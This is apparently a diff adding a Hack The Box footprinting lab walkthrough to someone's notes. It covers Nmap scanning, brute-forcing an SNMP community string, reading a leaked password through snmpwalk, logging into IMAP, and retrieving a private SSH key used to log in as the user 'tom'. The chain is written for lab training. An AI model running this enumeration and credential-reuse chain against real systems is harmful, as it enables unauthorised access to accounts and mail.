@@ -5128,3 +5128,244 @@ select * from accounts.dbo.devsacc where name = 'HTB'
 ```
 
 ![](Pasted%20image%2020250531163652.png)
+
+# Footprinting Lab - Hard
+
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
+
+First I performed an Nmap scan:
+
+```shell
+ports=$(nmap -p- --min-rate=1000 -T4 10.129.202.20 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
+nmap -p$ports -sV 10.129.202.20
+
+[redacted]
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
+143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
+993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
+995/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
+```
+
+I noted that IMAP/POP3 was being used, so I launched the following Nmap scan:
+
+```shell
+nmap 10.129.202.20 -T4 -sV -p110,143,993,995 -sC
+
+[redacted]
+PORT    STATE SERVICE  REASON         VERSION
+110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: PIPELINING AUTH-RESP-CODE CAPA UIDL STLS SASL(PLAIN) RESP-CODES USER TOP
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Issuer: commonName=NIXHARD
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-11-10T01:30:25
+| Not valid after:  2031-11-08T01:30:25
+| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+| SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+| -----BEGIN CERTIFICATE-----
+| MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
+| zR+tR6z4TQ==
+|_-----END CERTIFICATE-----
+143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Issuer: commonName=NIXHARD
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-11-10T01:30:25
+| Not valid after:  2031-11-08T01:30:25
+| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+| SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+| -----BEGIN CERTIFICATE-----
+| MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
+| zR+tR6z4TQ==
+|_-----END CERTIFICATE-----
+|_imap-capabilities: Pre-login OK LOGIN-REFERRALS IMAP4rev1 have ENABLE ID LITERAL+ SASL-IR listed IDLE capabilities AUTH=PLAINA0001 more post-login STARTTLS
+993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Issuer: commonName=NIXHARD
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-11-10T01:30:25
+| Not valid after:  2031-11-08T01:30:25
+| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+| SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+| -----BEGIN CERTIFICATE-----
+| MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
+| zR+tR6z4TQ==
+|_-----END CERTIFICATE-----
+|_imap-capabilities: Pre-login OK IMAP4rev1 AUTH=PLAINA0001 ENABLE ID have SASL-IR LITERAL+ IDLE listed capabilities more post-login LOGIN-REFERRALS
+995/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
+|_pop3-capabilities: UIDL SASL(PLAIN) TOP PIPELINING AUTH-RESP-CODE CAPA USER RESP-CODES
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Issuer: commonName=NIXHARD
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-11-10T01:30:25
+| Not valid after:  2031-11-08T01:30:25
+| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+| SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+| -----BEGIN CERTIFICATE-----
+| MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
+| AzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
+| zR+tR6z4TQ==
+|_-----END CERTIFICATE-----
+```
+
+The common name is `NIXHARD`. As I didn't got any extra clue, I decided to perform a UDP scan:
+
+```shell
+nmap -sU -T4 10.129.202.20
+
+[redacted]
+PORT      STATE         SERVICE         REASON
+68/udp    open|filtered dhcpc           no-response
+161/udp   open          snmp            udp-response ttl 63
+```
+
+As SNMP is running on port 161, I decided to check it out:
+
+```shell
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
+10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
+```
+
+So the `backup` community is found. Now I'll analyze it:
+
+```shell
+snmpwalk -v2c -c backup 10.129.202.20
+
+[redacted]
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (170726) 0:28:27.26
+iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
+iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
+iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 06 02 08 06 2F 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 142
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
+iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
+iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
+iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
+iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
+Authentication token manipulation error
+chpasswd: (line 1, user tom) password not changed
+Changing password for tom."
+iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
+iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
+iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
+```
+
+Now we can see that there is a user called `tom` with the password `NMds732Js2761`. So we can now enumerate the IMAP/POP3:
+
+```shell
+curl -k 'imaps://10.129.202.20' --user tom:NMds732Js2761
+* LIST (\HasNoChildren) "." Notes
+* LIST (\HasNoChildren) "." Meetings
+* LIST (\HasNoChildren \UnMarked) "." Important
+* LIST (\HasNoChildren) "." INBOX
+```
+
+Now I'll connect to it:
+
+```shell
+openssl s_client -connect 10.129.202.20:imaps
+```
+
+Then I'll try to read the content of Important:
+
+```shell
+# These are the commands that I inputted in the IMAP connection
+1 LOGIN tom NMds732Js2761 # Login to the protocol
+
+1 LIST "" * # To confirm the shares
+
+1 SELECT INBOX # Select the SHARE
+
+1 STATUS INBOX (MESSAGES)
+	* STATUS INBOX (MESSAGES 1)
+	1 OK [CLIENTBUG] Status on selected mailbox completed (0.001 + 0.000 secs).
+
+1 FETCH 1 all # Retrieve the entire message
+	* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
+
+1 FETCH 1 BODY[] # Get the message content
+	* 1 FETCH (BODY[] {3661}
+	HELO dev.inlanefreight.htb
+	MAIL FROM:<tech@dev.inlanefreight.htb>
+	RCPT TO:<bob@inlanefreight.htb>
+	DATA
+	From: [Admin] <tech@inlanefreight.htb>
+	To: <tom@inlanefreight.htb>
+	Date: Wed, 10 Nov 2010 14:21:26 +0200
+	Subject: KEY
+	
+	-----BEGIN OPENSSH PRIVATE KEY-----
+	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+	NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+	+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
+	hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
+	[redacted]
+	H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
+	XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
+	-----END OPENSSH PRIVATE KEY-----
+```
+
+I've just found a private ssh key. So I'll save it to a file and connect via SSH:
+
+```shell
+chmod 400 priv_ssh.rsa
+ssh -i priv_ssh.rsa tom@10.129.202.20
+```
+
+Now as `tom`, I'll check his bash history:
+
+![](Pasted%20image%2020250602103015.png)
+
+So I'll connect to the mysql database as `tom`, using the previously found password `NMds732Js2761`:
+
+![](Pasted%20image%2020250602103303.png)
+
+
+
